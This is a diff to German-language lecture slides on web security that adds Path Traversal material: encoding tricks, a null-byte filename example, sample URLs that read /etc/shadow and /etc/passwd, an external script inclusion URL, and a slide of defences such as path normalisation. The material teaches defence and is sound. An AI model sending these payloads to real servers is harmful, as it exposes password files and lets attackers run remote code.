@@ -12,6 +12,8 @@
 \usepackage{xspace}
 \newcommand{\themename}{\textbf{\textsc{metropolis}}\xspace}
 
+\usepackage{hyperref}
+
 \usepackage{graphicx}
 \graphicspath{ {pics/} }
 
@@ -242,12 +244,55 @@
   \end{itemize}
 \end{frame}
 
-\begin{frame}[fragile]{Directory Traversal Attack}
-  Ein HTTP Angriff, bei dem ein Angreifer zugriff auf gesperrte Verzeichnisse gewinnt und Code auserhalb des root Verzeichnisses ausf\"uhrt.
+\begin{frame}[fragile]{Path Traversal Attack}
+  Ein HTTP Angriff, bei dem ein Angreifer Zugriff auf gesperrte Verzeichnisse gewinnt und Code ausserhalb des Web Root Verzeichnisses ausf\"uhrt.
+  \newline
+  \newline
+  Web Container Encoding:
+  \begin{lstlisting}[style=BashStyle]
+  ..%c0%af represents ../
+  ..%c1%9c represents ..\
+  \end{lstlisting}
+
+  Null bytes \%00 k\"onnen injeziert werden um Dateinahmen zu terminieren.
+  \begin{lstlisting}[style=BashStyle]
+  ?file=secret.doc%00.pdf
+  \end{lstlisting}
+  Java sieht .pdf, Betriebssystem sieht .doc
 \end{frame}
 
-\begin{frame}[fragile]{Directory Traversal Attack - Schutzma{\ss}nahmen}
-  test frame
+\begin{frame}[fragile]{Path Traversal Attack - Beispiele}
+  Beispiel Zugriff auf Dateien:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/get-files.jsp?file=report.pdf
+  http://some_site.com.br/some-page.asp?page=index.html
+  \end{lstlisting}
+
+  UNIX Passwort abgreifen:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/../../../../etc/shadow
+  http://some_site.com.br/get-files?file=/etc/passwd
+  \end{lstlisting}
+
+  Auch m\"oglich Dateien und Scripte von externen Websiten einzibinden:
+  \begin{lstlisting}[style=BashStyle]
+  http://some_site.com.br/some-page?page=http:
+    //other-site.com.br/other-page.htm/malicius-code.php
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Path Traversal Attack - Schutzma{\ss}nahmen}
+  \begin{itemize}
+    \item Nutzereingaben vermeiden wenn m\"oglich, bei Datei System Aufrufen
+    \item Indexes anstatt Dateinahmen verwenden, f\"ur Benutzereingaben
+    \item Nutzer soll nicht ganzen Pfad eingeben k\"onnen, mit eigenem Pfad umgeben
+    \item Pfade normalisieren
+    \begin{itemize}
+      \item "." Segmente entfernen
+      \item ".." - Segmente die ein nicht-".." Segment dafor haben werden entfernt
+      \item Wenn Pfad relative und das erste Segment enth\"alt ein ":" Charackter dann wir ein "." vorangestellt
+    \end{itemize}
+  \end{itemize}
 \end{frame}
 
 \begin{frame}[fragile]{Format String}
@@ -487,8 +532,9 @@
 
 \begin{frame}[fragile]{Quellen}
   \begin{itemize}
-    \item wikipedia.org
-    \item owasp.org
+    \item \url{wikipedia.org}
+    \item \url{owasp.org}
+    \item \url{https://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize()}
   \end{itemize}
 \end{frame}
 
